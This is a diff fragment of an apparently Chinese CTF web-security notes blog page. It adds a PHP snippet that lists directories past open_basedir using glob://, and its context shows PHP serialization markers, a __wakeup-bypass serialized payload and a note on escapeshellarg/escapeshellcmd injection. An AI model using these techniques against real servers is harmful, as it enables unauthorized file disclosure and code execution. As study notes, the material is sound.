+<h5 id="opendir-readdir-glob"><a href="#opendir-readdir-glob" class="headerlink" title="opendir()+readdir()+glob://"></a>opendir()+readdir()+glob://</h5><p>同样只能列出根目录已经open_basedir()允许的目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> ( <span class="hljs-variable">$b</span> = opendir(<span class="hljs-string">&#x27;glob:///*&#x27;</span>) ) &#123;<br>    <span class="hljs-keyword">while</span> ( (<span class="hljs-variable">$file</span> = readdir(<span class="hljs-variable">$b</span>)) !== <span class="hljs-literal">false</span> ) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    closedir(<span class="hljs-variable">$b</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+
 <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="序列化数据的标识"><a href="#序列化数据的标识" class="headerlink" title="序列化数据的标识"></a>序列化数据的标识</h3><blockquote>
 <p>a - array 数组<br>b - boolean 布尔型<br>d - double 浮点型<br>i - integer 整数型<br>o - common object 共同对象<br>r - reference 对象引用<br>s - string 纯字符串<br>S - string 此时字符串支持后面的字符用16进制表示<br>C - custom object 自定义对象<br>O - class 类<br>N - null 空<br>R - pointer reference 指针引用<br>U - unicode string Unicode编码的字符串（php4、5不支持）</p>
 <p>在php中，引用意为不同的名字访问同一个变量内容</p>
@@ -392,8 +539,6 @@
 <h3 id="绕过-wakeup"><a href="#绕过-wakeup" class="headerlink" title="绕过_wakeup()"></a>绕过_wakeup()</h3><p>序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行,并且不会报错,可以被正常反序列化</p>
 <p>如下对象属性个数为3，若将其更改为大于3即可绕过_wakeup()：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;test&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; test test1&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;test2&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot; * test3&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;hello&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>
-
-
 <h2 id="php伪协议的运用"><a href="#php伪协议的运用" class="headerlink" title="php伪协议的运用"></a>php伪协议的运用</h2><p><a href="http://na0hblog.top/">http://na0hblog.top/</a></p>
 <h2 id="escapeshellarg-escapeshellcmd造成的漏洞"><a href="#escapeshellarg-escapeshellcmd造成的漏洞" class="headerlink" title="escapeshellarg+escapeshellcmd造成的漏洞"></a>escapeshellarg+escapeshellcmd造成的漏洞</h2><ul>
 <li><p>Escapeshellarg：把字符串转码为可以在 shell 命令里使用的参数<br>Escapeshellcmd：对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义</p>
@@ -459,18 +604,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/03/10/VulnStack1/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">VulnStack1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/03/09/%E9%9A%8F%E4%BE%BF%E6%B3%A8blacklist%E5%BE%97%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/">
-                        <span class="hidden-mobile">随便注|blacklist => 的一些知识</span>
+                      <a href="/2021/03/10/VulnStack1/">
+                        <span class="hidden-mobile">VulnStack1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
